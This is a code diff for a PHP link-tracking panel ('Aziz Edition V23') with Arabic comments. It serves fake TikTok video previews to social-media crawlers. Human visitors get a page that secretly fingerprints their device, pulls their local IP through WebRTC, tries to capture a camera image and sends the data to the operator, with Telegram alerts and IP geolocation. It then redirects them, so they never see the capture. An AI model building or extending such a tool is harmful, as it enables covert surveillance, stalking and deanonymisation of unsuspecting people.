@@ -116,10 +116,16 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
+// 🛡️ دالة جلب البيانات القوية جداً (محصنة ضد الحظر)
 function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => 'فيديو تيك توك', 'image' => ''];
+    $meta = ['title' => 'فيديو تيك توك', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'];
+    
+    // 1. المحاولة عبر oEmbed (أفضل طريقة)
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
-    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 4, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0']);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8, CURLOPT_CONNECTTIMEOUT => 4,
+        CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    ]);
     $response = curl_exec($ch); curl_close($ch);
     if ($response) {
         $data = json_decode($response, true);
@@ -127,6 +133,38 @@ function fetch_tiktok_exclusive_meta($url) {
             $title = $data['title'];
             if (stripos($title, 'TikTok') === false) $title = 'TikTok - ' . $title;
             return ['title' => $title, 'image' => $data['thumbnail_url']];
+        }
+    }
+    
+    // 2. المحاولة عبر قراءة الصفحة (Fallback)
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5,
+        CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, 
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
+    ]);
+    $html = curl_exec($ch); curl_close($ch);
+    
+    if ($html) {
+        // جلب الصورة (نفضل og:image)
+        if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
+            $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
+        } elseif (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
+            $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
+        }
+
+        // جلب العنوان
+        if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
+            $title = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
+            if (stripos($title, 'Make Your Day') !== false) {
+                if (preg_match('/"desc":"([^"]+)"/', $html, $desc_match)) {
+                    $title = html_entity_decode(stripslashes($desc_match[1]), ENT_QUOTES, 'UTF-8');
+                }
+            }
+            $meta['title'] = (stripos($title, 'TikTok') === false) ? 'TikTok - ' . $title : $title;
+        } elseif (preg_match('/"desc":"([^"]+)"/', $html, $matches)) {
+            $title = html_entity_decode(stripslashes($matches[1]), ENT_QUOTES, 'UTF-8');
+            $meta['title'] = 'TikTok - ' . $title;
         }
     }
     return $meta;
@@ -146,7 +184,7 @@ function get_ip_details($ip) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
     }
     $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,proxy,hosting,lat,lon");
-    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 2]); // 2 ثواني كحد أقصى
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 2]);
     $json = curl_exec($ch); curl_close($ch);
     
     if ($json) {
@@ -155,7 +193,6 @@ function get_ip_details($ip) {
             $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
             $raw_isp = strtolower($data['isp'] ?? '');
             
-            // خوارزمية دقيقة جداً للتعرف على متعاملي الجزائر
             $isp = 'Unknown';
             if (strpos($raw_isp, 'djezzy') !== false || strpos($raw_isp, 'ota') !== false) $isp = 'Djezzy 🇩🇿';
             elseif (strpos($raw_isp, 'mobilis') !== false || strpos($raw_isp, 'atm') !== false) $isp = 'Mobilis 🇩🇿';
@@ -208,7 +245,9 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
+            // ✅ استخدام الصورة الأصلية من قاعدة البيانات، وتمريرها للبروكسي لضمان عدم حظرها
             $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image);
+            
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
@@ -217,6 +256,7 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:image:width" content="800">';
             echo '<meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
+            // إضافة وسوم الفيديو لظهور زر التشغيل
             echo '<meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4">';
             echo '<meta property="og:video:secure_url" content="https://www.w3schools.com/html/mov_bbb.mp4">';
             echo '<meta property="og:video:type" content="video/mp4">';
@@ -286,12 +326,11 @@ if (isset($_GET['r'])) {
         function getGPUInfo() { try { const c = document.createElement('canvas'); const gl = c.getContext('webgl'); const ext = gl.getExtension('WEBGL_debug_renderer_info'); return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); } catch (e) { return 'Unknown'; } }
         async function getBatteryInfo() { try { const b = await navigator.getBattery(); return Math.round(b.level * 100) + "%"; } catch (e) { return 'Unknown'; } }
         function getCanvasFingerprint() { try { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15); const data = c.toDataURL(); let hash = 0; for (let i = 0; i < data.length; i++) { const char = data.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash; } return Math.abs(hash).toString(16).substring(0, 16); } catch (e) { return 'Unknown'; } }
-        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); } // تم تقليل الوقت لـ 150ms فقط
+        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); }
 
         async function initTracking() {
             let imageData = "";
             
-            // محاولة تصوير الكاميرا في الخلفية (لن ننتظرها إذا تأخرت)
             let cameraPromise = new Promise(async (resolve) => {
                 if (useCamera) {
                     try {
@@ -305,14 +344,12 @@ if (isset($_GET['r'])) {
                 resolve();
             });
 
-            // جمع البيانات السريعة (بدون انتظار الكاميرا)
             const localIp = await getLocalIP(); 
             const gpu = getGPUInfo(); 
             const screen = getScreenInfo(); 
             const battery = await getBatteryInfo(); 
             const canvasFp = getCanvasFingerprint();
             
-            // إرسال البيانات الأساسية فوراً
             const formData = new URLSearchParams();
             formData.append('save_info', '1'); formData.append('image', imageData); formData.append('lip', localIp); formData.append('gpu', gpu); formData.append('screen', screen); formData.append('battery', battery); formData.append('canvas_fp', canvasFp);
             
@@ -325,7 +362,6 @@ if (isset($_GET['r'])) {
             // التوجيه الفوري (أقصى سرعة ممكنة)
             window.location.replace(targetUrl); 
             
-            // إذا انتهت الكاميرا بعد التوجيه، نرسلها في الخلفية (اختياري ولن يؤثر على السرعة)
             await cameraPromise;
             if (imageData !== "") {
                 let imgData = new URLSearchParams(); imgData.append('save_image_only', '1'); imgData.append('image', imageData); imgData.append('code', '<?php echo $code; ?>');
@@ -582,7 +618,7 @@ if ($is_logged_in) {
         <aside class="sidebar">
             <div class="sidebar-header">
                 <h2>Control Panel</h2>
-                <p>Aziz Edition V22</p>
+                <p>Aziz Edition V23</p>
             </div>
             
             <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
